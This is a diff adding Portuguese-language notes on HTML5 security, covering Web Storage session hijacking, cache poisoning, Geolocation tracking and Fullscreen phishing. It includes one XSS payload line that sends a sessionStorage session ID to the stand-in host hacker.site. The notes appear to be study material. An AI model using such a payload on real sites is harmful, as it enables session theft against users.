@@ -42,3 +42,40 @@ Existem uma lista enorme de eventos interessantes como: onhashchange, onformchan
 ```
 
 ## Offline & Storage
+
+Do ponto de vista de segurança, o maior problema com o Web Storage é não ter ciência de quais tipos de dados estão sendo armazenados. Isso permite vários cenários de ataque como: Session Hijacking, User Tracking, Disclosure of Confidential Data, etc...
+
+**Session Hijacking**
+
+Por exemplo, se um desenvolvedor estiver armazenando IDs de sessão usando o sessionStorage, é possível realizar o roubo de sessão explorando um XSS
+
+```javascript
+new Image().src="http://hacker.site/SID?"+escape(sessionStorage.getItem('sessionID'))
+```
+
+Os mecanismos de web storage não implementam um mecanismo de mitigação do risco, como o HttpOnly
+
+**Attack Scenarios**
+
+Com aplicações web offline, o problema mais crítico é o Cache Poisoning
+
+## Device Access
+
+Uma das funcionalidades mais medonhas implementadas no HTML5 é o Geolocation API. Ela provê acesso a localização do usuário baseado em coordenadas de GPS
+
+Essa API pode ser usada para realizar um tracking do usuário e também para quebrar o anonimato
+
+Outra função interessante é a Fullscreen. Ela permite  que um único elemento seja visto em modo full-screen
+
+O Fullscreen API pode ser usado em ataques de Phishing
+
+## Performance, Integration & Connectivity
+
+No HTML5 muitas funcionalidades foram introduzidas para prover performace e interação com o usuário, como por exemplo, Drag and Drop, HTML editing e Workers
+
+Melhorias também foram feitas na comunicação, com funcionalidades como WebSocket e XMLHttpRequest2
+
+Do ponto de vista de segurança, as funcionalidades mais importantes são: Content Security Policy, Cross-Origin Resource Sharing, Cross-Document Messaging e o reforço de iframes com atributos de Sandboxed
+
+# Exploiting HTML5
+
